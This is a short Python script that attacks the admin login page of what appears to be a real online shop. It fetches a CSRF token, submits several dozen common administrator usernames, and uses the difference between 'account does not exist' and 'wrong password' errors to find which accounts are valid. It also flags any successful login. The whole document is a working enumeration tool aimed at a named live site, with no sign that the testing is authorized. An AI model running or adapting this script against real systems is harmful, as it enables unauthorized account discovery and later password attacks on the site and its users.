import httpx, re
c=httpx.Client(verify=False, follow_redirects=True, timeout=15,
    headers={'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/121 Safari/537.36'})
URL='https://ofa77.shop/module/admin/unionshop/user/login'

def get_token():
    r=c.get(URL)
    m=re.search(r'name="_token" value="([^"]+)"', r.text)
    return m.group(1) if m else None

def probe(user, pw='pw'):
    tok=get_token()
    r=c.post(URL, data={'_token':tok,'username':user,'password':pw})
    m=re.search(r'(帳號不存在|密碼錯誤|success|dashboard|logout)', r.text)
    tag='NOT-EXIST'
    if '密碼錯誤' in r.text: tag='***USER-EXISTS***'
    elif '帳號不存在' in r.text: tag='not-exist'
    elif 'dashboard' in r.text or 'logout' in r.text: tag='***LOGIN***'
    return tag

usernames=['admin','administrator','root','manager','super','superadmin','admin888','admin123',
'admin01','admin1','ops','operation','operator','kefu','customer','support','service','staff',
'boss','owner','manager1','shop','mall','store','seller','vendor','finance','accountant','audit',
'test','guest','demo','webmaster','site','sys','system','admin@ofa77.com','admin@ofa77.shop',
'user','admin1234','admin2024','admin2025','admin2026','ofa77','ofa','superadmin','admin_admin',
'adminuser','webadmin','webmaster123','shopadmin','storeadmin','bshop','badmin','backadmin']
print('=== username enumeration ===')
for u in usernames:
    t=probe(u)
    if t!='not-exist':
        print(f'{u:25} {t}')
print('done')
